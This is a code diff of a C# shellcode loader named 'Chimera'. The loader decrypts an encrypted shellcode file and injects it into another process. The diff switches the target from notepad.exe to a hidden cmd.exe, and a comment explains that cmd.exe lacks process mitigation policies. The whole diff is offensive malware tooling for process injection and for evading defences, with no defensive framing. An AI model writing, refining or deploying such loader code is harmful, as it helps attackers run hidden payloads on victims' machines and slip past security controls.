@@ -1,5 +1,5 @@
 // Chimera Shellcode Loader
-// Injects donut-converted shellcode into notepad.exe
+// Injects donut-converted shellcode into cmd.exe
 // Compile: csc /target:exe /platform:x86 /out:loader.exe Loader.cs
 // Requires: shellcode.bin.enc in same directory (output of build_loader.py)
 
@@ -91,16 +91,17 @@ namespace ChimeraLoader
             return decrypted;
         }
 
-        static int FindNotepad()
+        static int FindCmd()
         {
-            Process[] procs = Process.GetProcessesByName("notepad");
+            // Try to find an existing cmd.exe first
+            Process[] procs = Process.GetProcessesByName("cmd");
             if (procs.Length > 0)
                 return procs[0].Id;
 
-            // No notepad running — start one hidden
-            var psi = new ProcessStartInfo("notepad.exe")
+            // No cmd running — start one hidden
+            var psi = new ProcessStartInfo("cmd.exe")
             {
-                WindowStyle = ProcessWindowStyle.Hidden,
+                WindowStyle    = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true
             };
             Process p = Process.Start(psi);
@@ -130,8 +131,8 @@ namespace ChimeraLoader
                 byte[] encrypted  = File.ReadAllBytes(shellcodePath);
                 byte[] shellcode  = DecryptShellcode(encrypted);
 
-                // Find or spawn notepad
-                int targetPid = FindNotepad();
+                // Find or spawn cmd.exe (no process mitigation policies unlike notepad)
+                int targetPid = FindCmd();
                 if (targetPid == 0) return;
 
                 // Open target process
